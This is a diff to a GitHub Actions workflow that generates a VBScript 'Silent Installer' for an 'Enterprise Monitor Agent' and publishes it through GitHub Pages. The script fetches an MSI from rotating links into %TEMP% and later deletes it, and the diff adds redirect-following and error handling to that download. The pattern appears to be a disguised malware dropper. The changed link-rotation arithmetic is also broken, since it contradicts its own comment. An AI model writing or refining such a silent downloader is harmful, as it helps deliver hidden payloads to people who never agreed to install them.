@@ -20,12 +20,12 @@ jobs:
         
         # Get current link based on 10-minute interval
         current_minute=$(date +%M)
-        link_index=$((current_minute / 10 % 10))
+        link_index=$((current_minute / 50 % 5))
         current_link=${links[$link_index]}
         
         echo "Creating VBS with link: $current_link"
         
-        # Create the VBS file using echo commands with your exact code
+        # Create the VBS file using echo commands with your improved code
         echo "' --------------------------------------------------------------------------" > installer.vbs
         echo "'  Silent Installer - Enterprise Monitor Agent" >> installer.vbs
         echo "' --------------------------------------------------------------------------" >> installer.vbs
@@ -42,11 +42,22 @@ jobs:
         echo "strTemp = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")" >> installer.vbs
         echo "strFile = strTemp & \"\\agent_installer.msi\"" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Download" >> installer.vbs
-        echo "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")" >> installer.vbs
+        echo "' Download with proper redirect handling" >> installer.vbs
+        echo "Set objXMLHTTP = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")" >> installer.vbs
         echo "objXMLHTTP.open \"GET\", strUrl, False" >> installer.vbs
         echo "objXMLHTTP.send()" >> installer.vbs
         echo "" >> installer.vbs
+        echo "' Check for any redirect (301, 302, etc.)" >> installer.vbs
+        echo "If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then" >> installer.vbs
+        echo "    ' Get the redirect location from headers" >> installer.vbs
+        echo "    strUrl = objXMLHTTP.getResponseHeader(\"Location\")" >> installer.vbs
+        echo "    " >> installer.vbs
+        echo "    ' Make a new request to the redirect URL" >> installer.vbs
+        echo "    objXMLHTTP.open \"GET\", strUrl, False" >> installer.vbs
+        echo "    objXMLHTTP.send()" >> installer.vbs
+        echo "End If" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "' Check if we got a successful response" >> installer.vbs
         echo "If objXMLHTTP.Status = 200 Then" >> installer.vbs
         echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> installer.vbs
         echo "    objADOStream.Open" >> installer.vbs
@@ -63,6 +74,8 @@ jobs:
         echo "    ' Cleanup" >> installer.vbs
         echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
         echo "    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile" >> installer.vbs
+        echo "Else" >> installer.vbs
+        echo "    WScript.Echo \"Download failed with status: \" & objXMLHTTP.Status" >> installer.vbs
         echo "End If" >> installer.vbs
         
         # Create index.html for GitHub Pages
